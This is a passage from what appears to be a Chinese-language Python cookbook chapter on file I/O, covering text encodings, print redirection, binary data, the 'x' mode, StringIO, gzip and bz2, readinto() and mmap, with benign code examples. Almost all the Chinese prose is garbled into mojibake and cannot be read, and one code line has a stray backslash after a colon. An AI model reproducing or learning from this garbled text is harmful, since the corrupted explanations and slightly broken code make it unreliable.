world!\\n' >>> # Newline translation disabled >>> g = open('hello.txt', 'rt', newline='') >>> g.read() 'hello world!\\r\\n' >>> æ–‡æœ¬æ–‡ä»¶ä¸­å¯èƒ½å‡ºç°çš„ç¼–ç é”™è¯¯ã€‚ä½†ä½ è¯»å–æˆ–è€…å†™å…¥ä¸€ä¸ªæ–‡æœ¬ æ–‡ä»¶æ—¶ï¼Œä½ å¯èƒ½ä¼šé‡åˆ°ä¸€ä¸ªç¼–ç æˆ–è€…è§£ç é”™è¯¯. è¡¨ç¤ºä½ è¯»å–æ–‡æœ¬æ—¶æŒ‡å®šçš„ç¼–ç ä¸æ­£ç¡®ã€‚ä½ æœ€å¥½ä»”ç»†é˜…è¯»è¯´ æ˜å¹¶ç¡®è®¤ä½ çš„æ–‡ä»¶ç¼–ç æ˜¯æ­£ç¡®çš„ (æ¯”å¦‚ä½¿ç”¨ UTF-8 è€Œä¸æ˜¯ Latin-1 ç¼–ç æˆ–å…¶ä»–)ã€‚ å¦‚æœ ç¼–ç é”™è¯¯è¿˜æ˜¯å­˜åœ¨çš„è¯ï¼Œä½ å¯ä»¥ç»™ open() å‡½æ•°ä¼ é€’ä¸€ä¸ªå¯é€‰çš„ errors å‚æ•°æ¥å¤„ç†è¿™ äº›é”™è¯¯ã€‚ä¸‹é¢æ˜¯ä¸€äº›å¤„ç†å¸¸è§é”™è¯¯çš„æ–¹æ³•: >>> # Replace bad chars with Unicode U+fffd replacement char >>> f = open('sample.txt', 'rt', encoding='ascii', errors='replace') >>> f.read() 'Spicy Jalape?o!' >>> # Ignore bad chars entirely >>> g = open('sample.txt', 'rt', encoding='ascii', errors='ignore') >>> g.read() 'Spicy Jalapeo!' >>> å¦‚æœä½ ç»å¸¸ä½¿ç”¨ errors å‚æ•°æ¥å¤„ç†ç¼–ç é”™è¯¯ï¼Œå¯èƒ½ä¼šè®©ä½ çš„ç”Ÿæ´»å˜å¾—å¾ˆç³Ÿç³•ã€‚ å¯¹ äºæ–‡æœ¬å¤„ç†çš„é¦–è¦åŸåˆ™æ˜¯ç¡®ä¿ä½ æ€»æ˜¯ä½¿ç”¨çš„æ˜¯æ­£ç¡®ç¼–ç ã€‚ å½“æ¨¡æ£±ä¸¤å¯çš„æ—¶å€™ï¼Œå°±ä½¿ç”¨é»˜ è®¤çš„è®¾ç½® (é€šå¸¸éƒ½æ˜¯ UTF-8) æ‰“å°è¾“å‡ºè‡³æ–‡ä»¶ä¸­ å°† print() å‡½æ•°çš„è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­å». åœ¨ print() å‡½æ•°ä¸­æŒ‡å®š file å…³é”®å­—å‚æ•°: with open('d:/work/test.txt', 'wt') as f: print('Hello World!', file=f) æ–‡ä»¶å¿…é¡»æ˜¯ä»¥æ–‡æœ¬ æ¨¡å¼æ‰“å¼€ã€‚å¦‚æœæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ¨¡å¼çš„è¯ï¼Œæ‰“å°å°±ä¼šå‡ºé”™ã€‚ ä½¿ç”¨å…¶ä»–åˆ†éš”ç¬¦æˆ–è¡Œç»ˆæ­¢ç¬¦æ‰“å° ä½¿ç”¨ print() å‡½æ•°è¾“å‡ºæ•°æ®ï¼Œä½†æ˜¯æƒ³æ”¹å˜é»˜è®¤çš„åˆ†éš”ç¬¦æˆ–è€…è¡Œå°¾ç¬¦ å¯ä»¥ä½¿ç”¨åœ¨ print() å‡½æ•°ä¸­ä½¿ç”¨ sep å’Œ end å…³é”®å­—å‚æ•°ï¼Œä»¥ä½ æƒ³è¦çš„æ–¹å¼è¾“å‡ºã€‚ æ¯”å¦‚: >>> print('ACME', 50, 91.5) ACME 50 91.5 >>> print('ACME', 50, 91.5, sep=',') ACME,50,91.5 >>> print('ACME', 50, 91.5, sep=',', end='!!\\n') ACME,50,91.5!! >>> è¯»å†™å­—èŠ‚æ•°æ® è¯»å†™äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¯”å¦‚å›¾ç‰‡ï¼Œå£°éŸ³æ–‡ä»¶ç­‰ç­‰ã€‚ ä½¿ç”¨æ¨¡å¼ä¸º rb æˆ– wb çš„ open() å‡½æ•°æ¥è¯»å–æˆ–å†™å…¥äºŒè¿›åˆ¶æ•°æ® åœ¨è¯»å–äºŒè¿›åˆ¶æ•°æ®æ—¶ï¼Œéœ€è¦æŒ‡æ˜çš„æ˜¯æ‰€æœ‰è¿”å›çš„æ•°æ®éƒ½æ˜¯å­—èŠ‚å­—ç¬¦ä¸²æ ¼å¼çš„ï¼Œè€Œä¸ æ˜¯æ–‡æœ¬å­—ç¬¦ä¸²ã€‚ ç±»ä¼¼çš„ï¼Œåœ¨å†™å…¥çš„æ—¶å€™ï¼Œå¿…é¡»ä¿è¯å‚æ•°æ˜¯ä»¥å­—èŠ‚å½¢å¼å¯¹å¤–æš´éœ²æ•°æ®çš„å¯¹ è±¡ (æ¯”å¦‚å­—èŠ‚å­—ç¬¦ä¸²ï¼Œå­—èŠ‚æ•°ç»„å¯¹è±¡ç­‰)ã€‚ åœ¨è¯»å–äºŒè¿›åˆ¶æ•°æ®çš„æ—¶å€™ï¼Œå­—èŠ‚å­—ç¬¦ä¸²å’Œæ–‡æœ¬å­—ç¬¦ä¸²çš„è¯­ä¹‰å·®å¼‚å¯èƒ½ä¼šå¯¼è‡´ä¸€ä¸ª æ½œåœ¨çš„é™·é˜±ã€‚ ç‰¹åˆ«éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç´¢å¼•å’Œè¿­ä»£åŠ¨ä½œè¿”å›çš„æ˜¯å­—èŠ‚çš„å€¼è€Œä¸æ˜¯å­—èŠ‚å­—ç¬¦ ä¸²ã€‚æ¯”å¦‚: >>> b = b'Hello World' >>> b[0] 72 >>> for c in b: ... print(c) ... 72 101 108 108 111 ... >>> å¦‚æœä½ æƒ³ä»äºŒè¿›åˆ¶æ¨¡å¼çš„æ–‡ä»¶ä¸­è¯»å–æˆ–å†™å…¥æ–‡æœ¬æ•°æ®ï¼Œå¿…é¡»ç¡®ä¿è¦è¿›è¡Œè§£ç å’Œç¼– ç æ“ä½œã€‚æ¯”å¦‚: with open('somefile.bin', 'rb') as f: data = f.read(16) text = data.decode('utf-8') with open('somefile.bin', 'wb') as f: text = 'Hello World' f.write(text.encode('utf-8')) äºŒè¿›åˆ¶ I/O è¿˜æœ‰ä¸€ä¸ªé²œä¸ºäººçŸ¥çš„ç‰¹æ€§å°±æ˜¯æ•°ç»„å’Œ C ç»“æ„ä½“ç±»å‹èƒ½ç›´æ¥è¢«å†™å…¥ï¼Œè€Œ ä¸éœ€è¦ä¸­é—´è½¬æ¢ä¸ºè‡ªå·±å¯¹è±¡: import array nums = array.array('i', [1, 2, 3, 4]) with open('data.bin','wb') as f: f.write(nums) è¿™ä¸ªé€‚ç”¨äºä»»ä½•å®ç°äº†è¢«ç§°ä¹‹ä¸º\"ç¼“å†²æ¥å£\"çš„å¯¹è±¡ï¼Œè¿™ç§å¯¹è±¡ä¼šç›´æ¥æš´éœ²å…¶åº•å±‚ çš„å†…å­˜ç¼“å†²åŒºç»™èƒ½å¤„ç†å®ƒçš„æ“ä½œã€‚ äºŒè¿›åˆ¶æ•°æ®çš„å†™å…¥å°±æ˜¯è¿™ç±»æ“ä½œä¹‹ä¸€ã€‚ å¾ˆå¤šå¯¹è±¡è¿˜å…è®¸é€šè¿‡ä½¿ç”¨æ–‡ä»¶å¯¹è±¡çš„ readinto() æ–¹æ³•ç›´æ¥è¯»å–äºŒè¿›åˆ¶æ•°æ®åˆ°å…¶åº• å±‚çš„å†…å­˜ä¸­å»ã€‚æ¯”å¦‚: >>> import array >>> a = array.array('i', [0, 0, 0, 0, 0, 0, 0, 0]) >>> with open('data.bin', 'rb') as f: ... f.readinto(a) ... 16 >>> a array('i', [1, 2, 3, 4, 0, 0, 0, 0]) >>> ä½†æ˜¯ä½¿ç”¨è¿™ç§æŠ€æœ¯çš„æ—¶å€™éœ€è¦æ ¼å¤–å°å¿ƒï¼Œå› ä¸ºå®ƒé€šå¸¸å…·æœ‰å¹³å°ç›¸å…³æ€§ï¼Œå¹¶ä¸”å¯èƒ½ä¼š ä¾èµ–å­—é•¿å’Œå­—èŠ‚é¡ºåº (é«˜ä½ä¼˜å…ˆå’Œä½ä½ä¼˜å…ˆ)ã€‚ æ–‡ä»¶ä¸å­˜åœ¨æ‰èƒ½å†™å…¥ æƒ³åƒä¸€ä¸ªæ–‡ä»¶ä¸­å†™å…¥æ•°æ®ï¼Œä½†æ˜¯å‰æå¿…é¡»æ˜¯è¿™ä¸ªæ–‡ä»¶åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šä¸å­˜åœ¨ã€‚ä¹Ÿå°± æ˜¯ä¸å…è®¸è¦†ç›–å·²å­˜åœ¨çš„æ–‡ä»¶å†…å®¹ã€‚ å¯ä»¥åœ¨ open() å‡½æ•°ä¸­ä½¿ç”¨ x æ¨¡å¼æ¥ä»£æ›¿ w æ¨¡å¼çš„æ–¹æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜: >>> with open('somefile', 'wt') as f: ... f.write('Hello\\n') ... >>> with open('somefile', 'xt') as f: ... f.write('Hello\\n') ... Traceback (most recent call last): File \"<stdin>\", line 1, in <module> FileExistsError: [Errno 17] File exists: 'somefile' >>> å¦‚æœæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶çš„ï¼Œä½¿ç”¨ xb æ¥ä»£æ›¿ xt ç›¸å¯¹äºå…ˆæµ‹è¯•è¿™ä¸ªæ–‡ä»¶æ˜¯å¦å­˜åœ¨, ä½¿ç”¨ x æ–‡ä»¶æ¨¡å¼æ›´åŠ ç®€å•ã€‚ è¦æ³¨æ„çš„æ˜¯ x æ¨¡å¼æ˜¯ä¸€ä¸ª Python3 å¯¹ open() å‡½æ•°ç‰¹æœ‰çš„æ‰©å±•ã€‚ åœ¨ Python çš„æ—§ç‰ˆæœ¬æˆ–è€…æ˜¯ Python å®ç°çš„åº•å±‚ C å‡½æ•°åº“ä¸­éƒ½æ˜¯æ²¡æœ‰ è¿™ä¸ªæ¨¡å¼çš„ã€‚ å­—ç¬¦ä¸²çš„ I/O æ“ä½œ ä½¿ç”¨æ“ä½œç±»æ–‡ä»¶å¯¹è±¡çš„ç¨‹åºæ¥æ“ä½œæ–‡æœ¬æˆ–äºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚ ä½¿ç”¨ io.StringIO() å’Œ io.BytesIO() ç±»æ¥åˆ›å»ºç±»æ–‡ä»¶å¯¹è±¡æ“ä½œå­—ç¬¦ä¸²æ•°æ®: >>> s = io.StringIO() >>> s.write('Hello World\\n') 12 >>> print('This is a test', file=s) 15 >>> # Get all of the data written so far >>> s.getvalue() 'Hello World\\nThis is a test\\n' >>> >>> # Wrap a file interface around an existing string >>> s = io.StringIO('Hello\\nWorld\\n') >>> s.read(4) 'Hell' >>> s.read() 'o\\nWorld\\n' >>> io.StringIO åªèƒ½ç”¨äºæ–‡æœ¬ã€‚å¦‚æœä½ è¦æ“ä½œäºŒè¿›åˆ¶æ•°æ®ï¼Œè¦ä½¿ç”¨ io.BytesIO ç±»æ¥ ä»£æ›¿: >>> s = io.BytesIO() >>> s.write(b'binary data') >>> s.getvalue() b'binary data' >>> å½“ä½ æƒ³æ¨¡æ‹Ÿä¸€ä¸ªæ™®é€šçš„æ–‡ä»¶çš„æ—¶å€™ StringIO å’Œ BytesIO ç±»æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚ æ¯”å¦‚ï¼Œåœ¨ å•å…ƒæµ‹è¯•ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ StringIO æ¥åˆ›å»ºä¸€ä¸ªåŒ…å«æµ‹è¯•æ•°æ®çš„ç±»æ–‡ä»¶å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ å¯ä»¥è¢«ä¼ ç»™æŸä¸ªå‚æ•°ä¸ºæ™®é€šæ–‡ä»¶å¯¹è±¡çš„å‡½æ•°ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒStringIO å’Œ BytesIO å®ä¾‹å¹¶æ²¡æœ‰æ­£ç¡®çš„æ•´æ•°ç±»å‹çš„æ–‡ä»¶æè¿°ç¬¦ã€‚ å› æ­¤ï¼Œå®ƒä»¬ä¸èƒ½åœ¨é‚£äº›éœ€è¦ä½¿ç”¨çœŸå®çš„ç³»ç»Ÿçº§æ–‡ä»¶å¦‚æ–‡ä»¶ï¼Œç®¡é“æˆ–è€…æ˜¯å¥—æ¥å­—çš„ç¨‹åºä¸­ ä½¿ç”¨ã€‚ è¯»å†™å‹ç¼©æ–‡ä»¶ æƒ³è¯»å†™ä¸€ä¸ª gzip æˆ– bz2 æ ¼å¼çš„å‹ç¼©æ–‡ä»¶ã€‚ gzip å’Œ bz2 æ¨¡å—å¯ä»¥å¾ˆå®¹æ˜“çš„å¤„ç†è¿™äº›æ–‡ä»¶ã€‚ ä¸¤ä¸ªæ¨¡å—éƒ½ä¸º open() å‡½æ•°æä¾›äº† å¦å¤–çš„å®ç°æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æ¯”å¦‚ï¼Œä¸ºäº†ä»¥æ–‡æœ¬å½¢å¼è¯»å–å‹ç¼©æ–‡ä»¶ï¼Œå¯ä»¥è¿™æ ·åš: # gzip compression import gzip with gzip.open('somefile.gz', 'rt') as f: text = f.read() # bz2 compression import bz2 with bz2.open('somefile.bz2', 'rt') as f: text = f.read() å¤§éƒ¨åˆ†æƒ…å†µä¸‹è¯»å†™å‹ç¼©æ•°æ®éƒ½æ˜¯å¾ˆç®€å•çš„ã€‚ä½†æ˜¯è¦æ³¨æ„çš„æ˜¯é€‰æ‹©ä¸€ä¸ªæ­£ç¡®çš„æ–‡ä»¶ æ¨¡å¼æ˜¯éå¸¸é‡è¦çš„ã€‚ å¦‚æœä½ ä¸æŒ‡å®šæ¨¡å¼ï¼Œé‚£ä¹ˆé»˜è®¤çš„å°±æ˜¯äºŒè¿›åˆ¶æ¨¡å¼ï¼Œå¦‚æœè¿™æ—¶å€™ç¨‹ åºæƒ³è¦æ¥å—çš„æ˜¯æ–‡æœ¬æ•°æ®ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºé”™ã€‚ gzip.open() å’Œ bz2.open() æ¥å—è·Ÿå†…ç½®çš„ open() å‡½æ•°ä¸€æ ·çš„å‚æ•°ï¼ŒåŒ…æ‹¬ encodingï¼Œerrorsï¼Œnewline ç­‰ç­‰ã€‚ å½“å†™å…¥å‹ç¼©æ•°æ®æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ compresslevel è¿™ä¸ªå¯é€‰çš„å…³é”®å­—å‚æ•°æ¥æŒ‡å®šä¸€ä¸ª å‹ç¼©çº§åˆ«ã€‚æ¯”å¦‚: with gzip.open('somefile.gz', 'wt', compresslevel=5) as f: f.write(text) é»˜è®¤çš„ç­‰çº§æ˜¯ 9ï¼Œä¹Ÿæ˜¯æœ€é«˜çš„å‹ç¼©ç­‰çº§ã€‚ç­‰çº§è¶Šä½æ€§èƒ½è¶Šå¥½ï¼Œä½†æ˜¯æ•°æ®å‹ç¼©ç¨‹åº¦ä¹Ÿ è¶Šä½ã€‚ æœ€åä¸€ç‚¹ï¼Œgzip.open() å’Œ bz2.open() è¿˜æœ‰ä¸€ä¸ªå¾ˆå°‘è¢«çŸ¥é“çš„ç‰¹æ€§ï¼Œå®ƒä»¬å¯ä»¥ä½œ ç”¨åœ¨ä¸€ä¸ªå·²å­˜åœ¨å¹¶ä»¥äºŒè¿›åˆ¶æ¨¡å¼æ‰“å¼€çš„æ–‡ä»¶ä¸Šã€‚ æ¯”å¦‚ï¼Œä¸‹é¢ä»£ç æ˜¯å¯è¡Œçš„: import gzip f = open('somefile.gz', 'rb') with gzip.open(f, 'rt') as g: text = g.read() è¿™æ ·å°±å…è®¸ gzip å’Œ bz2 æ¨¡å—å¯ä»¥å·¥ä½œåœ¨è®¸å¤šç±»æ–‡ä»¶å¯¹è±¡ä¸Šï¼Œæ¯”å¦‚å¥—æ¥å­—ï¼Œç®¡é“å’Œ å†…å­˜ä¸­æ–‡ä»¶ç­‰ã€‚ å›ºå®šå¤§å°è®°å½•çš„æ–‡ä»¶è¿­ä»£ åœ¨ä¸€ä¸ªå›ºå®šé•¿åº¦è®°å½•æˆ–è€…æ•°æ®å—çš„é›†åˆä¸Šè¿­ä»£ï¼Œè€Œä¸æ˜¯åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ä¸€è¡Œä¸€ è¡Œçš„è¿­ä»£ã€‚ ä½¿ç”¨ iter å’Œ functools.partial() å‡½æ•°: from functools import partial RECORD_SIZE = 32 with open('somefile.data', 'rb') as f: records = iter(partial(f.read, RECORD_SIZE), b'') for r in records: ... è¿™ä¸ªä¾‹å­ä¸­çš„ records å¯¹è±¡æ˜¯ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼Œå®ƒä¼šä¸æ–­çš„äº§ç”Ÿå›ºå®šå¤§å°çš„æ•°æ® å—ï¼Œç›´åˆ°æ–‡ä»¶æœ«å°¾ã€‚ è¦æ³¨æ„çš„æ˜¯å¦‚æœæ€»è®°å½•å¤§å°ä¸æ˜¯å—å¤§å°çš„æ•´æ•°å€çš„è¯ï¼Œæœ€åä¸€ä¸ªè¿” å›å…ƒç´ çš„å­—èŠ‚æ•°ä¼šæ¯”æœŸæœ›å€¼å°‘ã€‚ åœ¨ä¾‹å­ä¸­ï¼Œfunctools.partial ç”¨æ¥åˆ›å»ºä¸€ä¸ªæ¯æ¬¡è¢«è°ƒç”¨æ—¶ä»æ–‡ä»¶ä¸­è¯»å–å›ºå®šæ•° ç›®å­—èŠ‚çš„å¯è°ƒç”¨å¯¹è±¡ã€‚æ ‡è®°å€¼ b'' å°±æ˜¯å½“åˆ°è¾¾æ–‡ä»¶ç»“å°¾æ—¶çš„è¿”å›å€¼ã€‚ æœ€åå†æä¸€ç‚¹ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­çš„æ–‡ä»¶æ—¶ä»¥äºŒè¿›åˆ¶æ¨¡å¼æ‰“å¼€çš„ã€‚ å¦‚æœæ˜¯è¯»å–å›ºå®šå¤§å° çš„è®°å½•ï¼Œè¿™é€šå¸¸æ˜¯æœ€æ™®éçš„æƒ…å†µã€‚è€Œ å¯¹äºæ–‡æœ¬æ–‡ä»¶ï¼Œä¸€è¡Œä¸€è¡Œçš„è¯»å– (é»˜è®¤çš„è¿­ä»£è¡Œä¸º) æ›´æ™®éç‚¹ã€‚ è¯»å–äºŒè¿›åˆ¶æ•°æ®åˆ°å¯å˜ç¼“å†²åŒºä¸­ ç›´æ¥è¯»å–äºŒè¿›åˆ¶æ•°æ®åˆ°ä¸€ä¸ªå¯å˜ç¼“å†²åŒºä¸­ï¼Œè€Œä¸éœ€è¦åšä»»ä½•çš„ä¸­é—´å¤åˆ¶æ“ä½œã€‚ æˆ–è€…ä½ æƒ³åŸåœ°ä¿®æ”¹æ•°æ®å¹¶å°†å®ƒå†™å›åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­å»ã€‚ ä¸ºäº†è¯»å–æ•°æ®åˆ°ä¸€ä¸ªå¯å˜æ•°ç»„ä¸­ï¼Œä½¿ç”¨æ–‡ä»¶å¯¹è±¡çš„ readinto() æ–¹æ³•: import os.path def read_into_buffer(filename): buf = bytearray(os.path.getsize(filename)) with open(filename, 'rb') as f:\\ f.readinto(buf) return buf ä¾‹å­: >>> # Write a sample file >>> with open('sample.bin', 'wb') as f: ... f.write(b'Hello World') ... >>> buf = read_into_buffer('sample.bin') >>> buf bytearray(b'Hello World') >>> buf[0:5] = b'Hallo' >>> buf bytearray(b'Hallo World') >>> with open('newsample.bin', 'wb') as f: ... f.write(buf) ... 11 >>> æ–‡ä»¶å¯¹è±¡çš„ readinto() æ–¹æ³•èƒ½è¢«ç”¨æ¥ä¸ºé¢„å…ˆåˆ†é…å†…å­˜çš„æ•°ç»„å¡«å……æ•°æ®ï¼Œç”šè‡³åŒ…æ‹¬ ç”± array æ¨¡å—æˆ– numpy åº“åˆ›å»ºçš„æ•°ç»„ã€‚ å’Œæ™®é€š read() æ–¹æ³•ä¸åŒçš„æ˜¯ï¼Œreadinto() å¡« å……å·²å­˜åœ¨çš„ç¼“å†²åŒºè€Œä¸æ˜¯ä¸ºæ–°å¯¹è±¡é‡æ–°åˆ†é…å†…å­˜å†è¿”å›å®ƒä»¬ã€‚ å› æ­¤ï¼Œä½ å¯ä»¥ä½¿ç”¨å®ƒæ¥é¿ å…å¤§é‡çš„å†…å­˜åˆ†é…æ“ä½œã€‚æ¯”å¦‚ï¼Œå¦‚æœä½ è¯»å–ä¸€ä¸ªç”±ç›¸åŒå¤§å°çš„è®°å½•ç»„æˆçš„äºŒè¿›åˆ¶æ–‡ä»¶ æ—¶ï¼Œä½ å¯ä»¥åƒä¸‹é¢è¿™æ ·å†™: record_size = 32 # Size of each record (adjust value) buf = bytearray(record_size) with open('somefile', 'rb') as f: while True: n = f.readinto(buf) if n < record_size: break # Use the contents of buf ... å¦å¤–æœ‰ä¸€ä¸ªæœ‰è¶£ç‰¹æ€§å°±æ˜¯ memoryview ï¼Œå®ƒå¯ä»¥é€šè¿‡é›¶å¤åˆ¶çš„æ–¹å¼å¯¹å·²å­˜åœ¨çš„ç¼“å†² åŒºæ‰§è¡Œåˆ‡ç‰‡æ“ä½œï¼Œç”šè‡³è¿˜èƒ½ä¿®æ”¹å®ƒçš„å†…å®¹ã€‚æ¯”å¦‚: >>> buf bytearray(b'Hello World') >>> m1 = memoryview(buf) >>> m2 = m1[-5:] >>> m2 <memory at 0x100681390> >>> m2[:] = b'WORLD' >>> buf bytearray(b'Hello WORLD') >>> ä½¿ç”¨ f.readinto() æ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½ å¿…é¡»æ£€æŸ¥å®ƒçš„è¿”å›å€¼ï¼Œä¹Ÿå°±æ˜¯å®é™…è¯»å–çš„ å­—èŠ‚æ•°ã€‚ å¦‚æœå­—èŠ‚æ•°å°äºç¼“å†²åŒºå¤§å°ï¼Œè¡¨æ˜æ•°æ®è¢«æˆªæ–­æˆ–è€…è¢«ç ´åäº† (æ¯”å¦‚ä½ æœŸæœ›æ¯æ¬¡è¯»å– æŒ‡å®šæ•°é‡çš„å­—èŠ‚)ã€‚ æœ€åï¼Œç•™å¿ƒè§‚å¯Ÿå…¶ä»–å‡½æ•°åº“å’Œæ¨¡å—ä¸­å’Œ into ç›¸å…³çš„å‡½æ•° (æ¯”å¦‚ recv_into() ï¼Œ pack_into() ç­‰)ã€‚ Python çš„å¾ˆå¤šå…¶ä»–éƒ¨åˆ†å·²ç»èƒ½æ”¯æŒç›´æ¥çš„ I/O æˆ–æ•°æ®è®¿é—®æ“ä½œï¼Œè¿™ äº›æ“ä½œå¯è¢«ç”¨æ¥å¡«å……æˆ–ä¿®æ”¹æ•°ç»„å’Œç¼“å†²åŒºå†…å®¹ã€‚ å†…å­˜æ˜ å°„çš„äºŒè¿›åˆ¶æ–‡ä»¶ ä½ æƒ³å†…å­˜æ˜ å°„ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶åˆ°ä¸€ä¸ªå¯å˜å­—èŠ‚æ•°ç»„ä¸­ï¼Œç›®çš„å¯èƒ½æ˜¯ä¸ºäº†éšæœºè®¿é—® å®ƒçš„å†…å®¹æˆ–è€…æ˜¯åŸåœ°åšäº›ä¿®æ”¹ã€‚ ä½¿ç”¨ mmap æ¨¡å—æ¥å†…å­˜æ˜ å°„æ–‡ä»¶ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå·¥å…·å‡½æ•°ï¼Œå‘ä½ æ¼”ç¤ºäº†å¦‚ä½•æ‰“å¼€ä¸€ä¸ª æ–‡ä»¶å¹¶ä»¥ä¸€ç§ä¾¿æ·æ–¹å¼å†…å­˜æ˜ å°„è¿™ä¸ªæ–‡ä»¶: import os import mmap def memory_map(filename, access=mmap.ACCESS_WRITE): size = os.path.getsize(filename) fd = os.open(filename, os.O_RDWR) return mmap.mmap(fd, size, access=access) ä¸ºäº†ä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼Œä½ éœ€è¦æœ‰ä¸€ä¸ªå·²åˆ›å»ºå¹¶ä¸”å†…å®¹ä¸ä¸ºç©ºçš„æ–‡ä»¶ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹ å­ï¼Œæ•™ä½ æ€æ ·åˆå§‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶å†…å®¹æ‰©å……åˆ°æŒ‡å®šå¤§å°: >>> size = 1000000 >>> with open('data', 'wb') as f: ... f.seek(size-1) ... f.write(b'\\x00') ... >>> åˆ©ç”¨ memory_map() å‡½æ•°ç±»å†…å­˜æ˜ å°„æ–‡ä»¶å†…å®¹: >>> m = memory_map('data') >>> len(m) 1000000 >>> m[0:10] b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> m[0] 0 >>> # Reassign a slice >>> m[0:11] = b'Hello World' >>> m.close() >>> # Verify that changes were made >>> with open('data', 'rb') as f: ... print(f.read(11)) ... b'Hello World' >>> mmap() è¿”å›çš„ mmap å¯¹è±¡åŒæ ·ä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨æ¥ä½¿ç”¨ï¼Œè¿™æ—¶å€™åº•å±‚ çš„æ–‡ä»¶ä¼šè¢«è‡ªåŠ¨å…³é—­ã€‚æ¯”å¦‚: >>> with memory_map('data') as m: ... print(len(m)) ... print(m[0:10]) ... 1000000 b'Hello World' >>> m.closed True >>> é»˜è®¤æƒ…å†µä¸‹ï¼Œmemeory_map() å‡½æ•°æ‰“å¼€çš„æ–‡ä»¶åŒæ—¶æ”¯æŒè¯»å’Œå†™æ“ä½œã€‚ä»»ä½•çš„ä¿®æ”¹ å†…å®¹éƒ½ä¼šå¤åˆ¶å›åŸæ¥çš„æ–‡ä»¶ä¸­ã€‚ å¦‚æœéœ€è¦åªè¯»çš„è®¿é—®æ¨¡å¼ï¼Œå¯ä»¥ç»™å‚æ•° access èµ‹å€¼ä¸º mmap.ACCESS_READ å¦‚æœä½ æƒ³åœ¨æœ¬åœ°ä¿®æ”¹æ•°æ®ï¼Œä½†æ˜¯åˆä¸æƒ³å°†ä¿®æ”¹å†™å›åˆ°åŸå§‹æ–‡ä»¶ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ mmap.ACCESS_COPY mmap ä½¿ç”¨å¯å‚è€ƒ: /docs/åç«¯/python/pythonæ ‡å‡†åº“/mmap ä¸ºäº†éšæœºè®¿é—®æ–‡ä»¶çš„å†…å®¹ï¼Œä½¿ç”¨ mmap å°†æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­æ˜¯ä¸€ä¸ªé«˜æ•ˆå’Œä¼˜é›…çš„æ–¹ æ³•ã€‚ ä¾‹å¦‚ï¼Œä½ æ— éœ€æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¹¶æ‰§è¡Œå¤§é‡çš„ seek() ï¼Œread() ï¼Œwrite() è°ƒç”¨ï¼Œåªéœ€ è¦ç®€å•çš„æ˜ å°„æ–‡ä»¶å¹¶ä½¿ç”¨åˆ‡ç‰‡æ“ä½œè®¿é—®æ•°æ®å³å¯ã€‚ ä¸€èˆ¬æ¥è®²ï¼Œmmap() æ‰€æš´éœ²çš„å†…å­˜çœ‹ä¸Šå»å°±æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ•°ç»„å¯¹è±¡ã€‚ä½†æ˜¯ï¼Œä½ å¯ä»¥ ä½¿ç”¨ä¸€ä¸ªå†…å­˜è§†å›¾æ¥è§£æå…¶ä¸­çš„æ•°æ®ã€‚æ¯”å¦‚: >>> m = memory_map('data') >>> # Memoryview of unsigned integers >>> v = memoryview(m).cast('I') >>> v[0] = 7 >>> m[0:4] b'\\x07\\x00\\x00\\x00' >>> m[0:4] = b'\\x07\\x01\\x00\\x00' >>> v[0] 263 >>> éœ€è¦å¼ºè°ƒçš„ä¸€ç‚¹æ˜¯ï¼Œå†…å­˜æ˜ å°„ä¸€ä¸ªæ–‡ä»¶å¹¶ä¸ä¼šå¯¼è‡´æ•´ä¸ªæ–‡ä»¶è¢«è¯»å–åˆ°å†…å­˜ä¸­ã€‚ ä¹Ÿå°± æ˜¯è¯´ï¼Œæ–‡ä»¶å¹¶æ²¡æœ‰è¢«å¤åˆ¶åˆ°å†…å­˜ç¼“å­˜æˆ–æ•°ç»„ä¸­ã€‚ ç›¸åï¼Œæ“ä½œç³»ç»Ÿä»…ä»…ä¸ºæ–‡ä»¶å†…å®¹ä¿ç•™äº† ä¸€æ®µè™šæ‹Ÿå†…å­˜ã€‚ å½“ä½ è®¿é—®æ–‡ä»¶çš„ä¸åŒåŒºåŸŸæ—¶ï¼Œè¿™äº›åŒºåŸŸçš„å†…å®¹æ‰æ ¹æ®éœ€è¦è¢«è¯»å–å¹¶æ˜ å°„ åˆ°å†…å­˜åŒºåŸŸä¸­ã€‚ è€Œé‚£äº›ä»æ²¡è¢«è®¿é—®åˆ°çš„éƒ¨åˆ†è¿˜æ˜¯ç•™åœ¨ç£ç›˜ä¸Šã€‚æ‰€æœ‰è¿™äº›è¿‡ç¨‹æ˜¯é€æ˜çš„ï¼Œ åœ¨å¹•åå®Œæˆ! å¦‚æœå¤šä¸ª Python è§£é‡Šå™¨å†…å­˜æ˜ å°„åŒä¸€ä¸ªæ–‡ä»¶ï¼Œå¾—åˆ°çš„ mmap 